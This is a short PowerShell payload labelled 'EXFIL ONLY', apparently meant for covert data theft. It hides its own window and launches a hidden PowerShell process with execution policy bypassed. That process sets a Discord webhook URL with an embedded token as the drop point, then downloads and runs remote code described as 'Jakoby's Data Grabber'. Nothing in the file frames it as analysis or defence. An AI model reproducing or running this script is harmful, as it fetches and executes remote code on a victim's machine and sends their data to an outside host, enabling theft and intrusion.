# === EXFIL ONLY ===

# Hide Powershell Window Immediately
Add-Type -Name Win32 -Namespace Console -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(int handle, int state);'
$consolePtr = (Get-Process -Id $PID).MainWindowHandle
[Console.Win32]::ShowWindow($consolePtr, 0)

# Launch Jakoby's Data Grabber quietly
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-w hidden -nop -ep bypass -c `$dc='https://discord.com/api/webhooks/1365055728540192768/OuKkYZ-oElNOxNubYLXeFRCr2VimO4RkH_BMaTYNDacyw2ifou-r-Bzbp4pH33OeQXcU';iex((New-Object Net.WebClient).DownloadString('https://jakoby.lol/9nb'))"

# Exit Cleanly
exit
